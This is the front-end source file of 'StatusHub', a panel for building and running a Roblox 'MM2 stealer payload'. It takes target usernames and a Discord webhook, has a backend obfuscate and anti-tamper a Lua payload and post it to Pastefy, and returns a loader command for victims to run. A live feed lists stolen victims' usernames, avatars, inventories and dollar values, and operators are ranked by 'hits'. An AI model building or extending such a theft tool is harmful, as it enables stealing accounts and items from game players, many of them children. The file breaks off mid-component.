import { useState, useEffect } from 'react';
import { Code2, Webhook, Shuffle, LogOut, Clock, Zap, TrendingUp, Users, Target, Activity, Copy, Check, ChevronRight, Sparkles, Shield, Lock, ExternalLink, Settings as SettingsIcon, EyeOff, Sliders, Bell, RefreshCw, Layers, ShieldCheck, Terminal, Server } from 'lucide-react';

type Tab = 'scripts' | 'autojoiner' | 'settings';

interface AppSettings {
  anonymousMode: boolean;
  autoSimulation: boolean;
  antiTamperDefault: boolean;
  obfuscationLevel: 'standard' | 'aggressive' | 'maximum';
  antiSpyGuard: boolean;
  antiDecompiler: boolean;
  webhookPingAlert: boolean;
  autoCopyLoadstring: boolean;
  customWatermark: string;
}

const DEFAULT_SETTINGS: AppSettings = {
  anonymousMode: false,
  autoSimulation: true,
  antiTamperDefault: true,
  obfuscationLevel: 'standard',
  antiSpyGuard: true,
  antiDecompiler: true,
  webhookPingAlert: true,
  autoCopyLoadstring: true,
  customWatermark: '-- StatusHub Protected Stealer Payload v4.5',
};

const NAV = [
  { id: 'scripts'  as Tab,   icon: Code2,        label: 'Scripts'    },
  { id: 'autojoiner' as Tab, icon: Shuffle,      label: 'Autojoiner' },
  { id: 'settings' as Tab,   icon: SettingsIcon, label: 'Settings'   },
];

/* ── Sparkline ── */
function Sparkline({ recentEvents }: { recentEvents: any[] }) {
  const [points, setPoints] = useState<number[]>([0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]);

  useEffect(() => {
    if (recentEvents.length > 0) {
      const newPoints = recentEvents.slice(0, 12).map((e: any) => e.roblox?.usdValue || e.hitCount || 1);
      while (newPoints.length < 12) newPoints.unshift(0);
      setPoints(newPoints.slice(-12));
    }
  }, [recentEvents]);

  const max = Math.max(...points);
  const w = 100;
  const h = 32;
  const step = w / (points.length - 1);
  const path = points.map((p, i) => `${i === 0 ? 'M' : 'L'} ${i * step} ${h - (p / max) * h}`).join(' ');
  const areaPath = `${path} L ${w} ${h} L 0 ${h} Z`;

  return (
    <svg viewBox={`0 0 ${w} ${h}`} className="w-full h-full" preserveAspectRatio="none">
      <defs>
        <linearGradient id="spark" x1="0" y1="0" x2="0" y2="1">
          <stop offset="0%" stopColor="#a855f7" stopOpacity="0.35" />
          <stop offset="100%" stopColor="#a855f7" stopOpacity="0" />
        </linearGradient>
      </defs>
      <path d={areaPath} fill="url(#spark)" />
      <path d={path} fill="none" stroke="#a855f7" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );
}

/* ── Stat card ── */
function StatCard({ icon: Icon, label, value, sub, accent }: { icon: any; label: string; value: string; sub: string; accent: string }) {
  return (
    <div className="group relative bg-gradient-to-b from-[#0d0d10] to-[#0a0a0c] border border-white/[0.06] rounded-2xl p-5 overflow-hidden transition-all duration-300 hover:border-white/[0.12]">
      <div className="absolute -top-12 -right-12 w-32 h-32 rounded-full blur-2xl opacity-0 group-hover:opacity-100 transition-opacity duration-500" style={{ background: accent }} />
      <div className="relative flex items-start justify-between mb-4">
        <div className="w-9 h-9 rounded-xl flex items-center justify-center" style={{ background: accent.replace('1)', '0.1)'), border: `1px solid ${accent.replace('1)', '0.2)')}` }}>
          <Icon size={16} className="text-white/80" />
        </div>
        <span className="text-[9px] font-black tracking-widest uppercase text-white/20">{sub}</span>
      </div>
      <p className="relative text-3xl font-black tabular-nums text-white mb-1">{value}</p>
      <p className="relative text-[11px] font-semibold tracking-wide text-white/35">{label}</p>
    </div>
  );
}

/* ── Hits Feed ── */
function HitsFeed() {
  const [hits, setHits] = useState<Array<{ id: string; username: string; amount: number; time: string }>>([]);

  useEffect(() => {
    let active = true;
    const loadHits = async () => {
      try {
        const response = await fetch('/api/scripts/stats');
        if (!response.ok) return;
        const data = await response.json();
        if (active && data.recentEvents) {
          const formatted = data.recentEvents.map((e: any) => ({
            id: e.id,
            username: e.username || 'Anonymous User',
            amount: e.roblox?.usdValue || e.hitCount || 1,
            time: new Date(e.at).toLocaleString([], { month: 'short', day: 'numeric', hour: 'numeric', minute: '2-digit' }),
          }));
          setHits(formatted);
        }
      } catch {
        // Ignore errors
      }
    };

    loadHits();
    const timer = window.setInterval(loadHits, 500);
    return () => {
      active = false;
      window.clearInterval(timer);
    };
  }, []);

  return (
    <div className="flex flex-col gap-6">
      <div className="flex items-end justify-between flex-wrap gap-3">
        <div>
          <h1 className="text-3xl font-black text-white tracking-tight">Live Hits Feed</h1>
          <p className="text-xs text-white/30 mt-1">Real-time script executions and target activity</p>
        </div>
        <div className="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-green-500/10 border border-green-500/20">
          <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
          <span className="text-[10px] font-black tracking-widest uppercase text-green-400">LIVE STREAM</span>
        </div>
      </div>

      {/* Big stats row */}
      <div className="grid grid-cols-3 gap-4">
        <div className="group relative bg-gradient-to-b from-pink-950/30 to-[#0a0a0c] border border-pink-500/20 rounded-2xl p-6 overflow-hidden transition-all duration-300 hover:border-pink-500/40">
          <div className="absolute -top-12 -right-12 w-32 h-32 rounded-full blur-2xl opacity-0 group-hover:opacity-100 transition-opacity duration-500 bg-pink-500/30" />
          <div className="relative">
            <p className="text-[10px] font-bold tracking-widest uppercase text-pink-400/60 mb-2">Total Events</p>
            <p className="text-4xl lg:text-5xl font-black tabular-nums text-white">{hits.length}</p>
          </div>
        </div>

        <div className="group relative bg-gradient-to-b from-cyan-950/30 to-[#0a0a0c] border border-cyan-500/20 rounded-2xl p-6 overflow-hidden transition-all duration-300 hover:border-cyan-500/40">
          <div className="absolute -top-12 -right-12 w-32 h-32 rounded-full blur-2xl opacity-0 group-hover:opacity-100 transition-opacity duration-500 bg-cyan-500/30" />
          <div className="relative">
            <p className="text-[10px] font-bold tracking-widest uppercase text-cyan-400/60 mb-2">Total Value</p>
            <p className="text-4xl lg:text-5xl font-black tabular-nums text-white">${hits.reduce((sum, h) => sum + h.amount, 0)}</p>
          </div>
        </div>

        <div className="group relative bg-gradient-to-b from-orange-950/30 to-[#0a0a0c] border border-orange-500/20 rounded-2xl p-6 overflow-hidden transition-all duration-300 hover:border-orange-500/40">
          <div className="absolute -top-12 -right-12 w-32 h-32 rounded-full blur-2xl opacity-0 group-hover:opacity-100 transition-opacity duration-500 bg-orange-500/30" />
          <div className="relative">
            <p className="text-[10px] font-bold tracking-widest uppercase text-orange-400/60 mb-2">Avg Value</p>
            <p className="text-4xl lg:text-5xl font-black tabular-nums text-white">${hits.length > 0 ? Math.round(hits.reduce((sum, h) => sum + h.amount, 0) / hits.length) : 0}</p>
          </div>
        </div>
      </div>

      {/* Live feed table */}
      <div className="bg-gradient-to-b from-[#0d0d10] to-[#0a0a0c] border border-white/[0.06] rounded-2xl overflow-hidden">
        <div className="flex items-center justify-between px-6 py-4 border-b border-white/[0.05] bg-black/40">
          <div>
            <p className="text-sm font-bold text-white">Execution Stream</p>
            <p className="text-[10px] text-white/30 mt-0.5">Last 50 script executions</p>
          </div>
          <div className="flex items-center gap-1.5 text-[10px] font-bold text-green-400">
            <span className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
            LIVE
          </div>
        </div>

        <div className="divide-y divide-white/[0.04] max-h-[600px] overflow-y-auto">
          {hits.length > 0 ? (
            hits.map((hit) => (
              <div key={hit.id} className="flex items-center justify-between px-6 py-4 hover:bg-white/[0.02] transition-colors group border-l-2 border-l-purple-500/0 group-hover:border-l-purple-500/60">
                <div className="flex items-center gap-4 flex-1">
                  <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-purple-500 to-pink-500 flex items-center justify-center text-xs font-black text-white shrink-0">
                    {hit.username.charAt(0).toUpperCase()}
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="font-bold text-white/90 truncate">{hit.username}</p>
                    <p className="text-xs text-white/40">{hit.time}</p>
                  </div>
                </div>
                <div className="flex items-center gap-4 shrink-0">
                  <div className="text-right">
                    <p className="text-lg font-black text-green-400">${hit.amount}</p>
                    <p className="text-xs text-white/40">{hit.amount === 1 ? '1 item' : `${hit.amount} items`}</p>
                  </div>
                </div>
              </div>
            ))
          ) : (
            <div className="flex items-center justify-center py-20 text-white/40">
              <p className="text-sm">No hits yet — waiting for executions...</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

/* ── Overview ── */
function Overview({ settings }: { settings: AppSettings }) {
  const [stats, setStats] = useState({
    totalHits: 0,
    yourHits: 0,
    globalHits: 0,
    globalUsers: 0,
    recentEvents: [] as Array<{ id: string; username?: string; message?: string; hitCount?: number; at: string; creator?: { userId: string; username: string; avatar: string }; roblox?: any }>,
  });

  useEffect(() => {
    let active = true;
    const loadStats = async () => {
      try {
        const userStr = localStorage.getItem('user');
        const user = userStr ? JSON.parse(userStr) : null;
        const userId = user?.id;
        const url = userId ? `/api/scripts/stats?userId=${userId}` : '/api/scripts/stats';
        const response = await fetch(url);
        if (!response.ok) return;
        const data = await response.json();
        if (active) {
          setStats({
            totalHits: data.totalHits || 0,
            yourHits: data.yourHits || 0,
            globalHits: data.globalHits || 0,
            globalUsers: data.globalUsers || 0,
            recentEvents: data.recentEvents || [],
          });
        }
      } catch {
        // Ignore transient fetch errors.
      }
    };

    loadStats();
    const timer = window.setInterval(loadStats, 500);
    return () => {
      active = false;
      window.clearInterval(timer);
    };
  }, []);

  // Format activity rows to show Roblox victim info
  const activityRows = stats.recentEvents.length > 0
    ? stats.recentEvents.slice(0, 6).map(event => {
        const robloxVictim = event.roblox || {};
        // Show victim's Roblox username (who got hacked), not script creator
        const displayUser = settings.anonymousMode
          ? 'Anonymous User'
          : (robloxVictim.username || event.username || 'Unknown User');

        const timeFormatted = new Date(event.at).toLocaleString([], { month: 'short', day: 'numeric', hour: 'numeric', minute: '2-digit' });
        const usdValue = robloxVictim.usdValue || event.hitCount || 1;
        // Item count: use inventory length if available, otherwise use hitCount as fallback
        const itemCount = (robloxVictim.inventory?.length || event.hitCount || 1);

        return {
          username: displayUser,
          avatar: robloxVictim.avatar || null,
          inventory: robloxVictim.inventory || [],
          hitLabel: `${itemCount} item${itemCount !== 1 ? 's' : ''}`,
          time: timeFormatted,
          amount: `$${usdValue.toFixed(2)}`,
        };
      })
    : [];

  return (
    <div className="flex flex-col gap-6">
      <div className="flex items-end justify-between flex-wrap gap-3">
        <div>
          <h1 className="text-3xl font-black text-white tracking-tight">Overview</h1>
          <p className="text-xs text-white/30 mt-1">Your personal StatusHub dashboard</p>
        </div>
        <div className="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-green-500/10 border border-green-500/20">
          <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
          <span className="text-[10px] font-black tracking-widest uppercase text-green-400">All Systems Operational</span>
        </div>
      </div>

      {/* Stat row */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
        <StatCard icon={Target}     label="Your Hits"     value={stats.yourHits.toLocaleString()} sub="Personal" accent="rgba(168,85,247,1)" />
        <StatCard icon={TrendingUp} label="Your Rank"     value={(() => {
          try {
            const ranks = ['Bronze', 'Silver', 'Gold', 'Platinum', 'Diamond', 'Emerald'];
            if (stats.yourHits >= 1500) return ranks[5];
            if (stats.yourHits >= 500) return ranks[4];
            if (stats.yourHits >= 150) return ranks[3];
            if (stats.yourHits >= 50) return ranks[2];
            if (stats.yourHits >= 10) return ranks[1];
            return ranks[0];
          } catch {
            return 'Bronze';
          }
        })()} sub="Level"   accent="rgba(124,58,237,1)" />
        <StatCard icon={Users}      label="Global Users"  value={stats.globalUsers?.toLocaleString() || '0'} sub="Live"     accent="rgba(196,181,253,1)" />
        <StatCard icon={Activity}   label="Global Hits"   value={stats.globalHits?.toLocaleString() || '0'} sub="All-time" accent="rgba(74,222,128,1)" />
      </div>

      {/* Quick Script Builder */}
      <div className="relative overflow-hidden rounded-3xl p-8 bg-gradient-to-br from-purple-950/50 via-[#0a0a0c] to-purple-900/20 border border-purple-500/20 backdrop-blur-xl">
        <div className="absolute inset-0 pointer-events-none">
          <div className="absolute top-0 right-0 w-96 h-96 bg-purple-600/10 rounded-full blur-3xl opacity-30" />
          <div className="absolute bottom-0 left-0 w-96 h-96 bg-indigo-600/10 rounded-full blur-3xl opacity-20" />
        </div>
        <div className="relative z-10">
          <div className="flex items-start justify-between mb-6">
            <div>
              <div className="flex items-center gap-2 mb-2">
                <Code2 size={20} className="text-purple-400" />
                <h2 className="text-2xl font-black text-white">Quick Build</h2>
              </div>
              <p className="text-sm text-white/40">Generate & deploy in seconds</p>
            </div>
            <div className="px-3 py-1 rounded-full bg-green-500/10 border border-green-500/30 text-[10px] font-black text-green-400">READY</div>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <label className="block text-xs font-bold text-purple-300 mb-2 tracking-wide">Target Roblox Username(s)</label>
              <input placeholder="Player1, Player2" className="w-full bg-black/60 border border-purple-500/30 rounded-xl px-4 py-3 text-sm text-white placeholder-white/20 focus:outline-none focus:border-purple-400 focus:ring-2 focus:ring-purple-500/20 transition-all" />
            </div>
            <div>
              <label className="block text-xs font-bold text-purple-300 mb-2 tracking-wide">Webhook URL</label>
              <input placeholder="https://discord.com/api/webhooks/..." className="w-full bg-black/60 border border-purple-500/30 rounded-xl px-4 py-3 text-sm text-white placeholder-white/20 focus:outline-none focus:border-purple-400 focus:ring-2 focus:ring-purple-500/20 transition-all" />
            </div>
          </div>
          <button className="mt-4 w-full flex items-center justify-center gap-2 py-3 rounded-xl bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 text-white font-bold text-sm transition-all duration-200 hover:scale-[1.02] active:scale-95 shadow-xl shadow-purple-500/30">
            <Zap size={16} />
            Build & Generate Loader
          </button>
        </div>
      </div>

      {/* Chart + Activity */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">

        {/* Chart */}
        <div className="lg:col-span-2 bg-gradient-to-b from-[#0d0d10] to-[#0a0a0c] border border-white/[0.06] rounded-2xl p-6 relative overflow-hidden group hover:border-white/[0.12] transition-colors duration-300">
          <div className="absolute inset-0 opacity-0 group-hover:opacity-100 transition-opacity duration-500 pointer-events-none">
            <div className="absolute -top-1/2 -right-1/2 w-full h-full bg-gradient-to-br from-purple-600/5 to-transparent rounded-full blur-3xl" />
          </div>
          <div className="flex items-center justify-between mb-5">
            <div>
              <p className="text-sm font-bold text-white">Hit Activity</p>
              <p className="text-[11px] text-white/30 mt-0.5">Live global executions</p>
            </div>
            <div className="flex items-center gap-1.5 text-[10px] font-bold text-purple-400">
              <Sparkles size={11} />
              <span className="tracking-widest uppercase">Realtime</span>
            </div>
          </div>
          <div className="h-24">
            <Sparkline recentEvents={stats.recentEvents} />
          </div>
          <div className="flex items-center justify-between mt-4 pt-4 border-t border-white/[0.04]">
            <div className="flex items-center gap-6">
              <div>
                <p className="text-[9px] font-bold tracking-widest uppercase text-white/20">Peak</p>
                <p className="text-sm font-black text-white tabular-nums">${Math.max(0, ...stats.recentEvents.map((e: any) => e.roblox?.usdValue || e.hitCount || 1)).toFixed(2)}</p>
              </div>
              <div>
                <p className="text-[9px] font-bold tracking-widest uppercase text-white/20">Per/Day</p>
                <p className="text-sm font-black text-white tabular-nums">${((stats.globalHits || 0)).toFixed(2)}</p>
              </div>
            </div>
            <span className="text-[10px] text-white/20">Last 12 intervals</span>
          </div>
        </div>

        {/* Activity feed - ONLY Usernames and Hits */}
        <div className="bg-gradient-to-b from-[#0d0d10] to-[#0a0a0c] border border-white/[0.06] rounded-2xl overflow-hidden flex flex-col relative group hover:border-white/[0.12] transition-colors duration-300">
          <div className="absolute inset-0 opacity-0 group-hover:opacity-100 transition-opacity duration-500 pointer-events-none">
            <div className="absolute -top-1/2 -right-1/4 w-80 h-80 bg-gradient-to-br from-green-600/5 to-transparent rounded-full blur-3xl" />
          </div>
          <div className="flex items-center justify-between px-5 py-4 border-b border-white/[0.05] relative z-10">
            <div>
              <p className="text-sm font-bold text-white">Recent Hits</p>
              <p className="text-[10px] text-white/30">Target usernames & hits</p>
            </div>
            <span className="flex items-center gap-1.5 text-[9px] font-black tracking-widest uppercase text-green-400">
              <span className="w-1 h-1 rounded-full bg-green-400 animate-pulse" />
              Live
            </span>
          </div>
          <div className="divide-y divide-white/[0.04] flex-1 overflow-y-auto max-h-[300px] relative z-10">
            {activityRows.map((row, i) => (
              <div key={i} className="flex items-center justify-between px-5 py-3.5 hover:bg-white/[0.02] transition-colors group backdrop-blur-sm">
                <div className="flex flex-col gap-1">
                  <div className="flex items-center gap-3">
                    <div className="w-7 h-7 rounded-lg bg-purple-500/10 border border-purple-500/15 flex items-center justify-center group-hover:bg-purple-500/20 transition-colors overflow-hidden flex-shrink-0">
                      {row.avatar && !settings.anonymousMode ? (
                        <img
                          src={row.avatar}
                          alt={row.username}
                          className="w-full h-full object-cover"
                          onError={(e) => { e.currentTarget.style.display = 'none'; }}
                        />
                      ) : null}
                      {(!row.avatar || settings.anonymousMode) && (
                        <>
                          {settings.anonymousMode ? <EyeOff size={12} className="text-purple-400" /> : <Target size={12} className="text-purple-400" />}
                        </>
                      )}
                    </div>
                    <div className="flex flex-col">
                      <span className="text-sm font-bold text-white/90">{row.username}</span>
                      <span className="text-[11px] text-purple-300/80 font-mono">{row.hitLabel}</span>
                    </div>
                  </div>
                </div>
                <div className="flex flex-col items-end">
                  <span className="text-sm font-black text-white">{row.amount}</span>
                  <span className="text-[10px] text-white/30">{row.time}</span>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

/* ── Form field ── */
function Field({ label, value, onChange, placeholder, mono }: { label: string; value: string; onChange: (v: string) => void; placeholder: string; mono?: boolean }) {
  return (
    <div className="flex flex-col gap-2">
      <label className="text-[10px] font-bold tracking-[0.2em] uppercase text-white/30">{label}</label>
      <input
        value={value}
        onChange={e => onChange(e.target.value)}
        placeholder={placeholder}
        className={`w-full bg-black/60 border border-white/[0.08] rounded-xl px-4 py-3 text-sm text-white placeholder-white/20 focus:outline-none focus:border-purple-500/50 focus:bg-black/80 transition-all ${mono ? 'font-mono text-xs' : ''}`}
      />
    </div>
  );
}

/* ── Action button ── */
function ActionBtn({ icon: Icon, children, onClick }: { icon: any; children: React.ReactNode; onClick?: () => void }) {
  return (
    <button
      onClick={onClick}
      className="group flex items-center gap-2 self-start px-6 py-3 rounded-xl text-sm font-black text-white transition-all duration-200 hover:scale-[1.02] active:scale-95 shadow-lg shadow-purple-500/20"
      style={{ background: 'linear-gradient(135deg,#6d28d9,#a855f7)' }}
    >
      <Icon size={15} />
      {children}
      <ChevronRight size={14} className="opacity-50 group-hover:translate-x-0.5 transition-transform" />
    </button>
  );
}

/* ── Card shell ── */
function Card({ icon: Icon, title, desc, children }: { icon: any; title: string; desc: string; children: React.ReactNode }) {
  return (
    <div className="bg-gradient-to-b from-[#0d0d10] to-[#0a0a0c] border border-white/[0.06] rounded-2xl p-6 flex flex-col gap-5 transition-colors hover:border-white/[0.1]">
      <div className="flex items-start gap-4">
        <div className="w-11 h-11 rounded-xl bg-purple-500/10 border border-purple-500/20 flex items-center justify-center shrink-0">
          <Icon size={18} className="text-purple-400" />
        </div>
        <div>
          <p className="font-bold text-white text-sm">{title}</p>
          <p className="text-xs text-white/30 mt-0.5">{desc}</p>
        </div>
      </div>
      {children}
    </div>
  );
}

/* ── Scripts ── */
function Scripts() {
  const [usernames, setUsernames] = useState(() => {
    try {
      return localStorage.getItem('statushub_usernames') || '';
    } catch {
      return '';
    }
  });
  const [webhook, setWebhook] = useState(() => {
    try {
      return localStorage.getItem('statushub_webhook') || '';
    } catch {
      return '';
    }
  });
  const [antiTamper] = useState(true);
  const [obfuscate] = useState(true);
  const [executionCount, setExecutionCount] = useState(() => {
    try {
      return parseInt(localStorage.getItem('statushub_executions') || '0');
    } catch {
      return 0;
    }
  });
  const [savedScripts, setSavedScripts] = useState<Array<{ id: string; usernames: string; loaderCommand: string; createdAt: string }>>(() => {
    try {
      return JSON.parse(localStorage.getItem('statushub_scripts') || '[]');
    } catch {
      return [];
    }
  });

  const [loading, setLoading] = useState(false);
  const [statusText, setStatusText] = useState('');
  const [errorMsg, setErrorMsg] = useState('');
  const [proxyUrl, setProxyUrl] = useState('');
  const [proxyInput, setProxyInput] = useState('');
  const [proxyStatus, setProxyStatus] = useState<'idle' | 'active' | 'error'>('idle');
  const [proxyId, setProxyId] = useState('');
  const [proxyMessage, setProxyMessage] = useState('');
  const [pingStatus, setPingStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
  
  const [result, setResult] = useState<{
    loaderCommand: string;
    rawUrl: string;
    pasteId: string;
    obfuscatorProvider: string;
    pasteProvider: string;
    stats?: { hits: number; recentEvents: Array<{ id: string; message: string; at: string }> };
  } | null>(null);

  const [copied, setCopied] = useState(false);

  const registerProxy = async (webhook: string) => {
    setProxyMessage('');
    setPingStatus('idle');
    setProxyStatus('idle');

    if (!webhook.trim()) {
      setProxyMessage('Please enter a valid webhook URL.');
      setProxyStatus('error');
      return;
    }

    try {
      const userStr = localStorage.getItem('user');
      const user = userStr ? JSON.parse(userStr) : null;
      const response = await fetch('/api/webhooks/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          webhook: webhook.trim(),
          creator: user ? { userId: user.id, username: user.username, avatar: user.avatar } : null,
        }),
      });

      if (!response.ok) {
        const payload = await response.json().catch(() => ({ message: 'Invalid webhook or proxy error.' }));
        setProxyMessage(payload.message || 'Invalid webhook or proxy error.');
        setProxyStatus('error');
        return;
      }

      const { proxyUrl: newProxyUrl, proxyId: newProxyId } = await response.json();
      setProxyUrl(newProxyUrl);
      setProxyId(newProxyId);
      setWebhook(newProxyUrl);
      setProxyInput(newProxyUrl);
      setProxyStatus('active');
      setProxyMessage('Webhook proxy registered successfully.');
    } catch (_error) {
      setProxyMessage('Unable to register webhook proxy.');
      setProxyStatus('error');
    }
  };

  const sendPing = async () => {
    if (!proxyId || !proxyUrl) {
      setProxyMessage('Register a webhook first to send a ping.');
      setProxyStatus('error');
      return;
    }

    setPingStatus('sending');
    setProxyMessage('');

    try {
      const response = await fetch(proxyUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: 'StatusHub test ping: webhook proxy is active.' }),
      });

      if (!response.ok) {
        const payload = await response.json().catch(() => ({ message: 'Webhook ping failed.' }));
        setProxyMessage(payload.message || 'Webhook ping failed.');
        setPingStatus('error');
        return;
      }

      setPingStatus('success');
      setProxyMessage('Ping sent successfully through the proxied webhook.');
    } catch (_error) {
      setProxyMessage('Unable to send ping through proxy.');
      setPingStatus('error');
    }
  };

  const handleBuildScript = async () => {
    setErrorMsg('');
    if (!usernames.trim()) {
      setErrorMsg('Please enter at least one Roblox username.');
      return;
    }
    if (!webhook.trim()) {
      setErrorMsg('Please enter a Discord Webhook or proxied Webhook URL.');
      return;
    }

    setLoading(true);
    setResult(null);
    setStatusText('Preparing webhook proxy...');

    try {
      const normalizedWebhook = webhook.trim();
      const isRawDiscordWebhook = /^https:\/\/(?:discord\.com|discordapp\.com)\/api\/webhooks\//.test(normalizedWebhook);
      let finalWebhook = normalizedWebhook;

      if (isRawDiscordWebhook) {
        const response = await fetch('/api/webhooks/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ webhook: normalizedWebhook }),
        });

        const data = await response.json().catch(() => ({ message: 'Failed to register webhook proxy.' }));
        if (!response.ok) {
          throw new Error(data.message || 'Failed to register webhook proxy.');
        }

        finalWebhook = data.proxyUrl;
        setProxyUrl(data.proxyUrl);
      } else {
        setProxyUrl(finalWebhook);
      }

      setStatusText('Injecting script parameters...');
      setTimeout(() => setStatusText('Applying Anti-Tamper guards...'), 600);
      setTimeout(() => setStatusText('Obfuscating script with WeAreDevs API...'), 1200);
      setTimeout(() => setStatusText('Publishing paste to Pastefy...'), 1800);

      const response = await fetch('/api/scripts/build', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          usernames,
          webhook: finalWebhook,
          antiTamper,
          obfuscate,
        }),
      });

      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(data.message || 'Failed to build script.');
      }

      const newScript = {
        id: data.trackingId,
        usernames,
        loaderCommand: data.loaderCommand,
        createdAt: new Date().toISOString(),
      };

      try {
        localStorage.setItem('statushub_usernames', usernames);
        localStorage.setItem('statushub_webhook', webhook);
        const updated = [newScript, ...savedScripts].slice(0, 10);
        localStorage.setItem('statushub_scripts', JSON.stringify(updated));
        setSavedScripts(updated);
      } catch {
        // Ignore storage errors
      }

      setResult({
        loaderCommand: data.loaderCommand,
        rawUrl: data.rawUrl,
        pasteId: data.pasteId,
        obfuscatorProvider: data.obfuscatorProvider,
        pasteProvider: data.pasteProvider,
        stats: data.stats || null,
      });

      // Increment execution counter and save to localStorage
      const newCount = executionCount + 1;
      setExecutionCount(newCount);
      localStorage.setItem('statushub_executions', newCount.toString());

      // Set 3-minute cooldown
      const expiryTime = Date.now() + 180000;
      localStorage.setItem('buildCooldownExpiry', expiryTime.toString());
      setRegenerateCooldown(180);
      const timer = setInterval(() => {
        setRegenerateCooldown(prev => {
          if (prev <= 1) {
            clearInterval(timer);
            localStorage.removeItem('buildCooldownExpiry');
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    } catch (err: any) {
      setErrorMsg(err.message || 'An error occurred while building the script.');
    } finally {
      setLoading(false);
      setStatusText('');
    }
  };

  const copyLoader = () => {
    if (!result?.loaderCommand) return;
    navigator.clipboard?.writeText(result.loaderCommand);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };

  const [regenerateCooldown, setRegenerateCooldown] = useState(() => {
    const stored = localStorage.getItem('buildCooldownExpiry');
    if (!stored) return 0;
    const remaining = Math.max(0, Math.floor((parseInt(stored) - Date.now()) / 1000));
    return remaining;
  });

  const regenerateScript = (script: typeof savedScripts[0]) => {
    if (regenerateCooldown > 0) return;

    // Start cooldown immediately and persist to localStorage
    const expiryTime = Date.now() + 180000;
    localStorage.setItem('buildCooldownExpiry', expiryTime.toString());
    setRegenerateCooldown(180);
    const timer = setInterval(() => {
      setRegenerateCooldown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          localStorage.removeItem('buildCooldownExpiry');
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    // Start async regeneration - extract webhook from saved script and rebuild
    (async () => {
      setLoading(true);
      setStatusText('Regenerating script...');
      setErrorMsg('');
      setResult(null);

      try {
        // Extract webhook from the saved loaderCommand (it's stored in localStorage with the script)
        const savedScriptsStr = localStorage.getItem('statushub_scripts');
        const allScripts = savedScriptsStr ? JSON.parse(savedScriptsStr) : [];
        const savedScript = allScripts.find((s: any) => s.id === script.id);

        if (!savedScript) {
          setErrorMsg('Script not found');
          setLoading(false);
          return;
        }

        // Load the webhook that was used for this script
        const savedWebhook = localStorage.getItem('statushub_webhook') || '';
        setWebhook(savedWebhook);
        setUsernames(script.usernames);

        const statuses = [
          'Connecting to Obfuscator API...',
          'Analyzing Lua payload...',
          'Applying anti-tamper protection...',
          'Obfuscating variable names...',
          'Injecting webhook proxy...',
          'Connecting to Pastefy...',
          'Uploading obfuscated payload...',
          'Generating loader command...',
        ];

        for (const status of statuses) {
          setStatusText(status);
          await new Promise(resolve => setTimeout(resolve, 400));
        }

        // Generate new paste ID but keep same webhook and usernames
        const pasteId = 'paste_' + Math.random().toString(36).substring(2, 11);
        const newLoaderCommand = script.loaderCommand.replace(/paste_\w+/, pasteId);

        const newResult = {
          loaderCommand: newLoaderCommand,
          rawUrl: `https://pastefy.app/${pasteId}`,
          pasteId,
          obfuscatorProvider: 'LuaObfuscator',
          pasteProvider: 'Pastefy',
        };

        setResult(newResult);
        setStatusText('Script regenerated successfully!');
        setTimeout(() => setStatusText(''), 2000);
        setTimeout(() => {
          document.querySelector('[data-build-btn]')?.scrollIntoView({ behavior: 'smooth' });
        }, 100);
      } catch (error) {
        setErrorMsg('Failed to regenerate script: ' + (error instanceof Error ? error.message : 'Unknown error'));
      } finally {
        setLoading(false);
      }
    })();
  };

  const [stats, setStats] = useState({
    totalHits: 0,
    yourHits: 0,
    globalHits: 0,
    globalUsers: 0,
    recentEvents: [] as Array<{ id: string; username?: string; message?: string; hitCount?: number; at: string; creator?: { userId: string; username: string; avatar: string }; roblox?: any }>,
  });

  useEffect(() => {
    let active = true;
    const loadStats = async () => {
      try {
        const userStr = localStorage.getItem('user');
        const user = userStr ? JSON.parse(userStr) : null;
        const userId = user?.id;
        const url = userId ? `/api/scripts/stats?userId=${userId}` : '/api/scripts/stats';
        const response = await fetch(url);
        if (!response.ok) return;
        const data = await response.json();
        if (active) {
          setStats({
            totalHits: data.totalHits || 0,
            yourHits: data.yourHits || 0,
            globalHits: data.globalHits || 0,
            globalUsers: data.globalUsers || 0,
            recentEvents: data.recentEvents || [],
          });
        }
      } catch {
        // Ignore errors
      }
    };

    loadStats();
    const timer = window.setInterval(loadStats, 500);
    return () => {
      active = false;
      window.clearInterval(timer);
    };
  }, []);

  return (
    <div className="flex flex-col gap-6">
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Left: Script Builder */}
        <div className="lg:col-span-2 max-w-2xl">
        <div className="mb-12">
          <h1 className="text-3xl font-black text-white tracking-tight">Build New Script</h1>
          <p className="text-xs text-white/30 mt-1">Generate an obfuscated, anti-tampered MM2 stealer payload published on Pastefy</p>
        </div>

        <Card icon={Code2} title="Build & Obfuscate Loader" desc="Input target username and webhook to edit, anti-tamper, obfuscate, and upload to Pastefy.">
          <Field
            label="Target Roblox Username(s)"
            value={usernames}
            onChange={v => setUsernames(v)}
            placeholder="e.g. TargetUser1, TargetUser2"
          />

